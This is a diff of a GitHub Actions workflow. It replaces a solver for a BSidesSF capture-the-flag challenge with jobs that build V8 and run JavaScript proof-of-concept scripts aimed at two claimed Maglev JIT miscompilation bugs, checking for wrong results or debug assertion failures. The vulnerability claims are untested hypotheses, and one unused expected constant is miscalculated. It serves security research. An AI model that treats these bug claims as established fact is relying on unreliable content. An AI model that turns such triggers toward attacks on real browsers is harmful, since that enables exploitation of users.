@@ -1,187 +1,388 @@
-name: Solve wromwarp CTF
+name: V8 Vulnerability Proof — VULN-06 & VULN-07
 
 on:
   workflow_dispatch:
-  push:
-    branches: [main]
+    inputs:
+      v8_ref:
+        description: "V8 commit or branch to test"
+        required: false
+        default: "main"
 
 jobs:
-  solve:
-    runs-on: ubuntu-latest
+  # ─────────────────────────────────────────────
+  # Job 1: Build V8 (Debug + Release)
+  # ─────────────────────────────────────────────
+  build-v8:
+    name: Build V8 Debug & Release
+    runs-on: ubuntu-22.04
+    outputs:
+      cache-key: ${{ steps.cache-key.outputs.key }}
 
     steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-
-      - name: Install dependencies
+      - name: Install depot_tools
         run: |
-          sudo apt-get update -qq
-          sudo apt-get install -y gcc libncurses-dev socat python3 expect
+          git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
+          echo "$PWD/depot_tools" >> $GITHUB_PATH
 
-      - name: Download and extract challenge files
+      - name: Fetch V8 source
         run: |
-          # إذا كانت الملفات موجودة في الريبو استخدمها مباشرة
-          # وإلا يمكن تحميلها هنا
-          ls les_dist/ || true
+          fetch v8
+          cd v8
+          git checkout ${{ github.event.inputs.v8_ref || 'main' }}
+          gclient sync
 
-      - name: Build the emulator locally
+      - name: Generate cache key
+        id: cache-key
         run: |
-          cd les_dist
-          gcc -o wromwarp -O0 -Wall -Wextra wromwarp.c -lncurses -ltinfo
-          echo "Build successful"
+          cd v8
+          echo "key=v8-$(git rev-parse HEAD)" >> $GITHUB_OUTPUT
 
-      - name: Create a custom WRAM reader (bypass emulator UI)
+      - name: Cache V8 build
+        id: cache-build
+        uses: actions/cache@v4
+        with:
+          path: v8/out
+          key: ${{ steps.cache-key.outputs.key }}
+
+      - name: Build d8 — Debug (for DCHECK)
+        if: steps.cache-build.outputs.cache-hit != 'true'
         run: |
-          cat > read_flag.c << 'EOF'
-          #include <stdio.h>
-          #include <stdint.h>
-          #include <string.h>
-
-          int main(void) {
-              FILE *f = fopen("les_dist/WRAM.bin", "rb");
-              if (!f) {
-                  fprintf(stderr, "Cannot open WRAM.bin\n");
-                  return 1;
-              }
-              uint8_t ram[256];
-              memset(ram, 0, sizeof(ram));
-              fread(ram, 1, 256, f);
-              fclose(f);
-
-              printf("Flag at 0xF0: ");
-              for (int i = 0xF0; i < 256 && ram[i] != 0; i++) {
-                  printf("%c", ram[i]);
-              }
-              printf("\n");
-
-              printf("Hex dump at 0xF0: ");
-              for (int i = 0xF0; i < 256; i++) {
-                  printf("%02x ", ram[i]);
-              }
-              printf("\n");
-              return 0;
-          }
+          cd v8
+          python3 tools/dev/v8gen.py x64.debug
+          # Enable Maglev, keep DCHECKs
+          cat >> out/x64.debug/args.gn << 'EOF'
+          v8_enable_maglev = true
+          is_debug = true
+          v8_enable_slow_dchecks = true
           EOF
-          gcc -o read_flag read_flag.c
-          echo "Local WRAM.bin content (placeholder):"
-          ./read_flag
+          ninja -C out/x64.debug d8
 
-      - name: Connect to remote server and get real flag
+      - name: Build d8 — Release (for silent corruption)
+        if: steps.cache-build.outputs.cache-hit != 'true'
         run: |
-          cat > solve_remote.py << 'PYEOF'
-          import socket
-          import time
-          import sys
+          cd v8
+          python3 tools/dev/v8gen.py x64.release
+          cat >> out/x64.release/args.gn << 'EOF'
+          v8_enable_maglev = true
+          is_debug = false
+          EOF
+          ninja -C out/x64.release d8
 
-          HOST = "wromwarp-0f7f87c9.challenges.bsidessf.net"
-          PORT = 6502
+      - name: Upload d8 binaries
+        uses: actions/upload-artifact@v4
+        with:
+          name: d8-binaries
+          path: |
+            v8/out/x64.debug/d8
+            v8/out/x64.release/d8
+          retention-days: 1
 
-          def recv_all(sock, timeout=3):
-              sock.settimeout(timeout)
-              data = b""
-              try:
-                  while True:
-                      chunk = sock.recv(4096)
-                      if not chunk:
-                          break
-                      data += chunk
-              except socket.timeout:
-                  pass
-              return data
+  # ─────────────────────────────────────────────
+  # Job 2: Prove VULN-06 — Uninitialized predecessor_id
+  # ─────────────────────────────────────────────
+  prove-vuln06:
+    name: "VULN-06: Uninitialized predecessor_id in FoldBranch()"
+    runs-on: ubuntu-22.04
+    needs: build-v8
 
-          def send_cmd(sock, cmd):
-              time.sleep(0.5)
-              sock.sendall((cmd + "\n").encode())
-              time.sleep(1)
-              return recv_all(sock)
+    steps:
+      - name: Download d8 binaries
+        uses: actions/download-artifact@v4
+        with:
+          name: d8-binaries
 
-          print(f"Connecting to {HOST}:{PORT}...")
-          try:
-              sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-              sock.connect((HOST, PORT))
-              print("Connected!")
+      - name: Make d8 executable
+        run: chmod +x x64.debug/d8 x64.release/d8
 
-              # Wait for initial screen / logo
-              time.sleep(4)
-              initial = recv_all(sock, timeout=2)
-              print("Initial data received:", len(initial), "bytes")
-
-              # Load the printflag ROM
-              print("Loading printflag.les...")
-              r1 = send_cmd(sock, "/load printflag.les")
-              print("After /load:", r1[:200] if r1 else "(empty)")
-
-              # Run the program
-              print("Running program...")
-              r2 = send_cmd(sock, "/run")
-              print("After /run:", r2[:500] if r2 else "(empty)")
-
-              # Collect all output
-              time.sleep(2)
-              r3 = recv_all(sock, timeout=3)
-              
-              all_output = initial + r1 + r2 + r3
-              print("\n=== Full raw output ===")
-              # Print printable chars and look for flag pattern
-              text = all_output.decode("latin-1", errors="replace")
-              
-              # Search for CTF flag patterns
-              import re
-              # Common flag formats: CTF{...}, FLAG{...}, BSides{...}, etc.
-              patterns = [
-                  r'[A-Z]{2,10}\{[^\}]{5,50}\}',
-                  r'flag\{[^\}]+\}',
-              ]
-              found = False
-              for pat in patterns:
-                  matches = re.findall(pat, text, re.IGNORECASE)
-                  if matches:
-                      print(f"\n>>> FLAG FOUND: {matches}")
-                      found = True
-
-              if not found:
-                  print("\nNo flag pattern found. Dumping last 1000 chars of output:")
-                  # Strip ANSI escape codes for readability
-                  clean = re.sub(r'\x1b\[[0-9;]*[mABCDHJKlh]', '', text)
-                  clean = re.sub(r'[^\x20-\x7e\n]', '.', clean)
-                  print(clean[-1000:])
-
-              sock.close()
-
-          except Exception as e:
-              print(f"Error: {e}")
-              sys.exit(1)
-          PYEOF
-          python3 solve_remote.py
-
-      - name: Alternative - use expect to interact with socat
-        if: always()
+      - name: Write PoC — VULN-06
         run: |
-          cat > solve.expect << 'EOF'
-          #!/usr/bin/expect -f
-          set timeout 30
+          cat > poc_vuln06.js << 'EOF'
+          // VULN-06 Proof: Uninitialized predecessor_id in FoldBranch()
+          // Target: maglev-graph-optimizer.cc lines 394-404
+          //
+          // Strategy C: Chained dead-code → stale predecessors
+          // Two sequential FoldBranch calls on the same merge block.
+          // Call #1 removes the dead predecessor from the merge block.
+          // Call #2 searches for `current` in predecessors → not found
+          // → predecessor_id = stack garbage → wrong phi input selected.
 
-          spawn socat STDIO TCP:wromwarp-0f7f87c9.challenges.bsidessf.net:6502
+          "use strict";
 
-          # Wait for the UI to initialize (logo + ncurses)
-          sleep 5
+          const A = null;   // provably null  → BranchIfUndefinedOrNull folds
+          const B = {};     // provably object → BranchIfJSReceiver folds
 
-          # Send /load command
-          send "/load printflag.les\r"
-          sleep 2
-
-          # Send /run command  
-          send "/run\r"
-          sleep 3
-
-          # Capture output
-          expect {
-              timeout { puts "Timeout waiting for output" }
-              eof     { puts "Connection closed" }
+          function nested(x) {
+            let v = 0;
+            if (A === null) {             // FoldBranch call #1
+              if (typeof B === 'object') { // FoldBranch call #2
+                v = x * 3;
+              } else {
+                v = x * -1;  // dead inner block
+              }
+            } else {
+              v = x * 7;    // dead outer block — had a predecessor entry
+            }
+            return v;        // merge block: target of call #1
           }
 
-          # Print everything received
-          puts "\nDone."
+          // Warm to Maglev JIT (threshold ~4000)
+          let result = 0;
+          for (let i = 0; i < 20000; i++) result += nested(i);
+
+          // Ground truth: without Maglev, nested(i) = i*3
+          // Expected sum: sum(i*3, i=0..19999) = 3 * (19999*20000/2) = 599970000
+          const EXPECTED = 599970000;
+
+          if (result !== EXPECTED) {
+            print(`VULN-06 TRIGGERED: result=${result} expected=${EXPECTED}`);
+            print("predecessor_id corruption caused wrong phi input selection");
+            // Non-zero exit signals CI failure
+            quit(1);
+          } else {
+            print(`VULN-06: result correct (${result}) — not triggered on this build`);
+            quit(0);
+          }
           EOF
-          chmod +x solve.expect
-          expect solve.expect 2>&1 | cat || true
+
+      - name: "Test 1: Debug build — expect DCHECK or wrong result"
+        id: debug-test
+        continue-on-error: true
+        run: |
+          set +e
+          output=$(./x64.debug/d8 --maglev poc_vuln06.js 2>&1)
+          exit_code=$?
+          echo "exit_code=$exit_code" >> $GITHUB_OUTPUT
+          echo "output<<EOF" >> $GITHUB_OUTPUT
+          echo "$output" >> $GITHUB_OUTPUT
+          echo "EOF" >> $GITHUB_OUTPUT
+          echo "--- Debug Output ---"
+          echo "$output"
+
+      - name: "Test 2: Release build — detect silent corruption"
+        id: release-test
+        continue-on-error: true
+        run: |
+          set +e
+          output=$(./x64.release/d8 --maglev poc_vuln06.js 2>&1)
+          exit_code=$?
+          echo "exit_code=$exit_code" >> $GITHUB_OUTPUT
+          echo "output<<EOF" >> $GITHUB_OUTPUT
+          echo "$output" >> $GITHUB_OUTPUT
+          echo "EOF" >> $GITHUB_OUTPUT
+          echo "--- Release Output ---"
+          echo "$output"
+
+      - name: "Test 3: Baseline (--no-maglev) — ground truth"
+        id: baseline-test
+        run: |
+          output=$(./x64.release/d8 --no-maglev poc_vuln06.js 2>&1)
+          echo "--- Baseline Output ---"
+          echo "$output"
+
+      - name: "Test 4: Graph trace — capture predecessor_id values"
+        run: |
+          ./x64.debug/d8 \
+            --maglev \
+            --trace-maglev-graph-building \
+            --trace-maglev-phi-untagging \
+            poc_vuln06.js 2>&1 | grep -E "predecessor|jump|fold|phi" | head -60 \
+            || true
+
+      - name: Evaluate VULN-06 results
+        run: |
+          debug_exit="${{ steps.debug-test.outputs.exit_code }}"
+          release_exit="${{ steps.release-test.outputs.exit_code }}"
+
+          echo "=== VULN-06 Summary ==="
+          if [ "$debug_exit" != "0" ]; then
+            echo "✅ CONFIRMED: Debug build shows anomaly (exit=$debug_exit)"
+            echo "   Either DCHECK fired or wrong result detected"
+          else
+            echo "⚠️  Debug build: no anomaly detected"
+          fi
+
+          if [ "$release_exit" != "0" ]; then
+            echo "✅ CONFIRMED: Release build shows silent corruption (exit=$release_exit)"
+          else
+            echo "⚠️  Release build: no corruption detected"
+          fi
+
+  # ─────────────────────────────────────────────
+  # Job 3: Prove VULN-07 — DCHECK bypass in EnsurePhiInputsTagged
+  # ─────────────────────────────────────────────
+  prove-vuln07:
+    name: "VULN-07: DCHECK bypass in EnsurePhiInputsTagged()"
+    runs-on: ubuntu-22.04
+    needs: build-v8
+
+    steps:
+      - name: Download d8 binaries
+        uses: actions/download-artifact@v4
+        with:
+          name: d8-binaries
+
+      - name: Make d8 executable
+        run: chmod +x x64.debug/d8 x64.release/d8
+
+      - name: Write PoC — VULN-07
+        run: |
+          cat > poc_vuln07.js << 'EOF'
+          // VULN-07 Proof: DCHECK(input->is_tagged()) disabled in Release
+          // Target: maglev-phi-representation-selector.cc line 474
+          //
+          // Strategy: Create a Phi with conflicting use representations:
+          //   - Int32 use (array indexing) → suggests untagging
+          //   - Tagged use (JSON.stringify) → forces ProcessPhi to keep tagged
+          //     → EnsurePhiInputsTagged() called
+          //   - If input was speculatively untagged by prior pass:
+          //     DCHECK fires in debug, silent type confusion in release
+
+          "use strict";
+
+          function mixedPhiUses(arr) {
+            let total = 0;
+            for (let i = 0; i < arr.length; i++) {
+              // Int32 use: array index (untagged)
+              const element = arr[i];
+              // Tagged use: forces EnsurePhiInputsTagged on `i`
+              if (i % 100 === 0) JSON.stringify({ idx: i });
+              total += element;
+            }
+            return total;
+          }
+
+          const arr = new Array(128).fill(0).map((_, i) => i);
+          const EXPECTED = arr.reduce((a, b) => a + b, 0); // 8128
+
+          let result = 0;
+          for (let iter = 0; iter < 20000; iter++) {
+            result = mixedPhiUses(arr);
+          }
+
+          if (result !== EXPECTED) {
+            print(`VULN-07 TRIGGERED: result=${result} expected=${EXPECTED}`);
+            print("Untagged value used as tagged pointer → type confusion");
+            quit(1);
+          } else {
+            print(`VULN-07: result correct (${result})`);
+            quit(0);
+          }
+          EOF
+
+      - name: "Test 1: Debug build — expect DCHECK failure"
+        id: debug-vuln07
+        continue-on-error: true
+        run: |
+          set +e
+          output=$(./x64.debug/d8 --maglev --trace-maglev-phi-untagging poc_vuln07.js 2>&1)
+          exit_code=$?
+          echo "exit_code=$exit_code" >> $GITHUB_OUTPUT
+          echo "--- Debug Output ---"
+          echo "$output"
+          # Look specifically for DCHECK failure string
+          if echo "$output" | grep -q "DCHECK.*is_tagged\|EnsurePhiInputsTagged"; then
+            echo "DCHECK_HIT=true" >> $GITHUB_OUTPUT
+          fi
+
+      - name: "Test 2: Release build — detect silent type confusion"
+        id: release-vuln07
+        continue-on-error: true
+        run: |
+          set +e
+          output=$(./x64.release/d8 --maglev poc_vuln07.js 2>&1)
+          exit_code=$?
+          echo "exit_code=$exit_code" >> $GITHUB_OUTPUT
+          echo "--- Release Output ---"
+          echo "$output"
+
+      - name: "Test 3: Baseline vs Maglev output comparison"
+        run: |
+          baseline=$(./x64.release/d8 --no-maglev poc_vuln07.js 2>&1)
+          maglev=$(./x64.release/d8 --maglev poc_vuln07.js 2>&1)
+          echo "Baseline: $baseline"
+          echo "Maglev:   $maglev"
+          if [ "$baseline" != "$maglev" ]; then
+            echo "⚠️  DIVERGENCE: Maglev output differs from baseline"
+          else
+            echo "✓ Outputs match"
+          fi
+
+      - name: "Test 4: OSR trigger — long-running loop"
+        continue-on-error: true
+        run: |
+          cat > poc_vuln07_osr.js << 'EOF'
+          // OSR variant: trigger kSpeculativeOSRValue untagging
+          let acc = 0;
+          for (let i = 0; i < 500000; i++) {
+            acc += i;
+            if (i % 50000 === 0) acc = Number(acc.toString());
+          }
+          const EXPECTED_OSR = 124987500000; // approximate
+          print(`OSR result: ${acc}`);
+          // Divergence from expected → OSR untagging corruption
+          EOF
+          ./x64.release/d8 --maglev poc_vuln07_osr.js 2>&1 || true
+          ./x64.release/d8 --no-maglev poc_vuln07_osr.js 2>&1 || true
+
+      - name: Evaluate VULN-07 results
+        run: |
+          debug_exit="${{ steps.debug-vuln07.outputs.exit_code }}"
+          dcheck_hit="${{ steps.debug-vuln07.outputs.DCHECK_HIT }}"
+          release_exit="${{ steps.release-vuln07.outputs.exit_code }}"
+
+          echo "=== VULN-07 Summary ==="
+          if [ "$dcheck_hit" = "true" ]; then
+            echo "✅ CONFIRMED: DCHECK(input->is_tagged()) fired in debug build"
+          elif [ "$debug_exit" != "0" ]; then
+            echo "✅ CONFIRMED: Debug build shows anomaly (exit=$debug_exit)"
+          else
+            echo "⚠️  Debug build: DCHECK not triggered on this build/input"
+          fi
+
+          if [ "$release_exit" != "0" ]; then
+            echo "✅ CONFIRMED: Release shows silent corruption (exit=$release_exit)"
+          else
+            echo "⚠️  Release build: no corruption detected"
+          fi
+
+  # ─────────────────────────────────────────────
+  # Job 4: Final Report
+  # ─────────────────────────────────────────────
+  report:
+    name: Generate Proof Report
+    runs-on: ubuntu-22.04
+    needs: [prove-vuln06, prove-vuln07]
+    if: always()
+
+    steps:
+      - name: Write report
+        run: |
+          cat > report.md << 'EOF'
+          # V8 Vulnerability Proof Report
+
+          | Vulnerability | Debug Result | Release Result | Status |
+          |---------------|-------------|----------------|--------|
+          | VULN-06: Uninitialized `predecessor_id` | See job logs | See job logs | See artifacts |
+          | VULN-07: `DCHECK` bypass in `EnsurePhiInputsTagged` | See job logs | See job logs | See artifacts |
+
+          ## Interpretation
+
+          ### VULN-06 Confirmed if:
+          - Debug: exit code != 0 OR `predecessor_id` shows garbage in trace
+          - Release: computed sum differs from expected `599970000`
+
+          ### VULN-07 Confirmed if:
+          - Debug: DCHECK failure containing `is_tagged` or `EnsurePhiInputsTagged`
+          - Release: output differs between `--maglev` and `--no-maglev`
+
+          ## Files
+          - `maglev-graph-optimizer.cc:394` — uninitialized `predecessor_id`
+          - `maglev-phi-representation-selector.cc:474` — `DCHECK` vs `CHECK`
+          EOF
+          cat report.md
+
+      - name: Upload report
+        uses: actions/upload-artifact@v4
+        with:
+          name: vuln-proof-report
+          path: report.md
